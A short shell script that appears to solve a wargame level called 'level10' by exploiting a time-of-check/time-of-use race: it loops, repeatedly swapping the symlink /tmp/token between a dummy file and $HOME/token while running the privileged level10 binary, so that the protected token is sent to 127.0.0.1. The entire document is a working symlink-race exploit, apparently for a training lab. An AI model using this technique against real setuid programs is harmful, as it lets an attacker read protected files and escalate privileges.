#!/bin/sh

touch /tmp/token42
while true
do
	ln -f -s /tmp/token42 /tmp/token &
	$HOME/level10 /tmp/token 127.0.0.1 &
	ln -f -s $HOME/token /tmp/token &
done
